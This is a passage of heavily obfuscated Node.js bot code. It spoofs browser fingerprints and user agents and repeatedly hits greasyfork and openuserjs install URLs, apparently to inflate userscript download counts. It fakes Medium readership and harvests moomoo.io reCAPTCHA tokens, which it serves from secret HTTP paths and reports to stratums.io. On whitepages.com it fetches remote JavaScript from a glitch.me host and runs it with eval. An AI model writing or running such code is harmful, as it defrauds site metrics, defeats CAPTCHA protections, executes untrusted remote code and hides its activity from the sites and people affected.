      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': a0(0xe, 'JI%&') + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + Z(0x6) + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + Y(0x10) + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    a0(0x13, '!@80') + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + a0(0x15, 'Pv#i') + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + Z(0xf) + Z(0xc) + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x3a * 0x69 + 0x400 + -0x1 * 0x1bca
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1 * -0x1bd4 + 0x20 * 0x49 + -0x24f4)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0xa92 + 0x3 * 0x5c5 + -0x1b7d), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x178f + 0x25 * -0xa3 + 0x64), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x40 * -0x5 + 0x1614 + -0x1754;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x21bb + 0x26dd * 0x1 + -0x522; w < getRandomInt(0x796 + -0x10c0 + 0x92b, 0xe5 + -0x4 * 0x552 + 0x51a * 0x4); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0xad3f * -0x1 + 0x7 * -0x3b81 + 0x33826);
        }
      }();
    }, -0x23ac + 0xd42 + 0x16ce * 0x1), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x4db * -0x1 + -0x3 * 0x40e + 0x74f;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x8b * -0x26 + -0x1 * -0x252e + 0x19 * -0x250, 0x1 * -0x39d + -0x1862 + 0x7 * 0x407)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0xc5 + 0x131 * 0x61 + 0x264);
    }, -0x19d9 + -0x1 * -0x12df + 0x75e), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0xd28 + 0x7 * 0x26b + -0x3c5 * 0x1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x3 * -0x829 + 0x54a * -0x1 + -0x779 * 0x1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0xdd8 * 0x1 + -0xd2f + 0x1b07), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0xd91da + 0x959 * 0x33 + 0x1970bf);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1b80 + 0x11a + 0x1aca);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1394 + -0x253d + 0x3999 * 0x1);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x1df3 + 0x3971 * 0x1 + -0x37d4);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = d;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x13e1 + -0xcc7 + -0x719 * 0x1) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0xb * 0x283 + -0x20a8 + 0x3c4a));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x76f + -0x2 * 0xdc9 + -0x1 * -0x1423, D['indexOf']('\x20'));
        return B ? E['slice'](0x252 + 0x56 + -0x2a8, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0xbbb + 0x164 * -0x1d + 0x1 * 0x5b1f),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x1 * 0x24b4 + -0x160 * 0x29 + 0x3 * 0x1394),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + a1(0x12) + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0xd46 * 0x2 + -0x1334 * -0x1 + -0x2dc0; k < -0x100a + 0x232b * 0x1 + -0x131d; k++)
    setTimeout(f, (0xd * 0x2365 + -0x2 * 0xdb6b + 0x227 * 0x63) * k * getRandomInt(-0x1 * -0x1a4e + 0x5 * -0x4c7 + 0x6 * -0x67, -0x1426 + 0x2444 + -0x101b));
  setInterval(() => {
    f();
    for (let l = -0x2596 + -0x18d * -0x12 + 0x9ac; l < -0x1 * -0x4b3 + 0x72b * 0x1 + -0xbda; l++)
      setTimeout(f, (0x1 * -0xca93 + -0x3b * 0xac + 0x1dc97) * l * getRandomInt(-0x1 * 0x2512 + -0xde * -0xa + 0x1c67, 0x1 * -0x1a2f + -0x1a73 + 0x34a5));
  }, -0x1 * 0x64ba07 + -0x53b264 + 0xef5aeb);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
